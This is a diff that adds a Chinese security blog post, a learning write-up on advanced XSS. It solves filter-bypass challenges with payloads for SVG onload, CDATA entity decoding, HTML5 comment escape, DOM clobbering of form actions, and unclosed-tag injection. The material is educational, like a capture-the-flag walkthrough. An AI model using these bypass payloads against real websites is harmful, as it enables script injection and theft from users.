@@ -1,0 +1,330 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>XSS进阶学习分享（一） | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">XSS进阶学习分享（一）</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2023-02-07</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://1dayluo.github.io/tag/5CW47rOjA1/">
+                    学习笔记
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/ZYt2rq1nxl/">
+                    笔记
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/U0Z0LJAyk7/">
+                    XSS
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/RsVeNwQ62C/">
+                    知识点巩固
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <p><s>偷悄悄：其实是技术分享用的PPT大纲</s></p>
+<p>后续会在blog继续更一些之前看到的h1的xss构造攻击链为rce的文章（或许）<br>
+更新了文章：https://1dayluo.github.io/post/xss-shui-ti-pian-guan-yu-dom-colbbering-yi-xie-ge-ren-li-jie/ 下对于DOM clobbering的理解。</p>
+<h2 id="从svg特性到高级xss利用">从SVG特性到高级XSS利用</h2>
+<h2 id="svg基础">svg基础</h2>
+<ul>
+<li>
+<p>svg是最短的攻击向量 ： <code>&lt;svg/onload=alert(1)&gt;</code></p>
+</li>
+<li>
+<p>svg特性可利用在绕过上：</p>
+<ul>
+<li>
+<p>XML-ish</p>
+</li>
+<li>
+<p>利用onload 和a绕过</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="xml-ish">XML-ish</h3>
+<p>它支持在两个svg标签里插入任何CDATA元素，其中包括 <code>&lt;script&gt;</code> 并被按照常规加载。</p>
+<p>题目：</p>
+<pre><code class="language-javascript">function escape(input) {
+    //                      v-- frowny face
+    input = input.replace(/[=(]/g, '');
+
+    // ok seriously, disallows equal signs and open parenthesis
+    return input;
+}     
+</code></pre>
+<p>过滤的场景：</p>
+<ul>
+<li>
+<p>传统的一些攻击向量</p>
+</li>
+<li>
+<p>“=” 被禁止：html标签下的属性</p>
+</li>
+<li>
+<p>“=”被禁止：事件处理，包括on开头的系列：例如onload</p>
+</li>
+<li>
+<p>左括号被禁止</p>
+</li>
+</ul>
+<p>没有考虑到的场景：</p>
+<ul>
+<li>svg的XML-ish特性</li>
+</ul>
+<p>绕过利用了svg支持标签内插入任何CDATA元素。</p>
+<p>在此之前先了解一下HTML解析机制：</p>
+<blockquote>
+<p>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’&lt;’符号（后面没有跟’/‘符号）就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”……最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。（原文内容）</p>
+</blockquote>
+<p>所以任何标签建立并解析的前提是被HTML解析器判定为”标签开始状态“。这也就是为什么不用svg，只是用16进制实体不能够触发alert，例如：</p>
+<pre><code class="language-javascript">&lt;div&gt;&amp;#60;img src&amp;#x3d;x onerror&amp;#x3d;alert&amp;#x28;1)&amp;#62;&lt;/div&gt;
+</code></pre>
+<p>在这种情况下，「字符引用」不会判定为标签开始状态，也就不会建立新标签并解析标签。</p>
+<p>像将实体编码放入 <code>script</code> 标签里也不可以：</p>
+<pre><code>&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;
+</code></pre>
+<p>因为script标签属于HTML里五类元素里的 原始文本元素，不支持解析字符引用。</p>
+<p>（五类：原始文本元素，RCDATA，空元素，外部元素，基本元素）</p>
+<p>那么，svg的XML-ish意味着什么呢？ 首先明确svg是属于外部元素的。</p>
+<p>XML-ish代表：<code>&lt;svg&gt;</code>遵循XML的定义。<br>
+在XML中实体会自动转义,除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体，所以最后的payload为：</p>
+<pre><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;&lt;/svg&gt;
+</code></pre>
+<h2 id="注释逃逸html5">注释逃逸：HTML5</h2>
+<p>题目</p>
+<pre><code>function escape(input) {
+    // filter potential comment end delimiters
+    input = input.replace(/-&gt;/g, '_');
+
+    // comment the input to avoid script execution
+    return '&lt;!-- ' + input + ' --&gt;';
+}
+</code></pre>
+<p>这里用HTML5对于注释的标准来绕过</p>
+<blockquote>
+<p>But, as it was first noted in 2012, HTML5 comments are a little bit special. Not only --&gt; but also the character sequence --!&gt;  has the ability to close comments and thereby it possible to bypass this filter as well.</p>
+</blockquote>
+<p>payload:</p>
+<pre><code class="language-javascript">--!&gt; &lt;svg/onload=prompt(1)&gt;
+</code></pre>
+<h2 id="dom-clobbering从html-injection到-javascript-injection">DOM Clobbering：从html injection到 javascript injection</h2>
+<p>题目</p>
+<pre><code class="language-javascript">  function escape(input) {
+    // let's do a post redirection
+    try {
+        // pass in formURL#formDataJSON
+        // e.g. http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}
+        var segments = input.split('#');
+        var formURL = segments[0];
+        var formData = JSON.parse(segments[1]);
+
+        var form = document.createElement('form');
+        form.action = formURL;
+        form.method = 'post';
+
+        for (var i in formData) {
+            var input = form.appendChild(document.createElement('input'));
+            input.name = i;
+            input.setAttribute('value', formData[i]);
+        }
+
+        return form.outerHTML + '                         \n\
+&lt;script&gt;                                                  \n\
+    // forbid javascript: or vbscript: and data: stuff    \n\
+    if (!/script:|data:/i.test(document.forms[0].action)) \n\
+        document.forms[0].submit();                       \n\
+    else                                                  \n\
+        document.write(&quot;Action forbidden.&quot;)               \n\
+&lt;/script&gt;                                                 \n\
+        ';
+    } catch (e) {
+        return 'Invalid form data.';
+    }
+}
+</code></pre>
+<p>读取代码，可以发现，会用<code>#</code> 对input进行分割，前半部分为form的action的值，后半部分插入到<code>&lt;input&gt;</code> 标签内。并且这一切生成 outerHTML里。</p>
+<p>可以看到，即使action注入了script也由于下面的if判断无法触发，那么该怎么办呢？</p>
+<p>这里用了标准下HTMLCollection的特性：</p>
+<blockquote>
+<p>The namedItem(key) method steps are:<br>
+If key is the empty string, return null.<br>
+Return the first element in the collection for which at least one of the following is true:<br>
+it has an ID which is key;<br>
+it is in the HTML namespace and has a name attribute whose value is key;<br>
+or null if there is no such element.</p>
+</blockquote>
+<p>重点在”Return the first element in the collection for which at least one of the following is true:“ 这句，下面有三个条件，满足一个即可。这里这道题我们用的是第三个条件，利用inputi标签name这个attribute。HTML解析会返回先搜索到的第一个属性名称为要查询的关键字（ <code>document.forms[0].action</code> )</p>
+<pre><code>javascript:prompt(1)#{&quot;action&quot;:1}
+</code></pre>
+<p>HTML看起来是这样的</p>
+<figure data-type="image" tabindex="1"><img src="https://i.imgur.com/ZeIxUr0.png" alt="" loading="lazy"></figure>
+<p>这里我们取 <code>document.forms[0].action</code> 取到的是</p>
+<figure data-type="image" tabindex="2"><img src="https://i.imgur.com/SvBaZBR.png" alt="" loading="lazy"></figure>
+<h2 id="利用自动补全绕过js语法">利用自动补全绕过js语法</h2>
+<p>题目</p>
+<pre><code class="language-javascript">function escape(input) {
+    // tags stripping mechanism from ExtJS library
+    // Ext.util.Format.stripTags
+    var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;
+    input = input.replace(stripTagsRE, '');
+
+    return '&lt;article&gt;' + input + '&lt;/article&gt;';
+}
+</code></pre>
+<p>这里它用正则表达式的 <code>gi</code> 限定了大小写不敏感匹配，但是，它没有考虑到不完整的标签</p>
+<p>我们用不完整的注入</p>
+<pre><code class="language-javascript">&lt;svg/onload=prompt(1)
+</code></pre>
+<p>这里HTML会自动补全后面的 <code>&gt;</code></p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/xss-shui-ti-pian-guan-yu-dom-colbbering-yi-xie-ge-ren-li-jie/">
+              <h3 class="post-title">
+                下一篇：XSS水题篇：关于DOM Colbbering一些个人理解
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
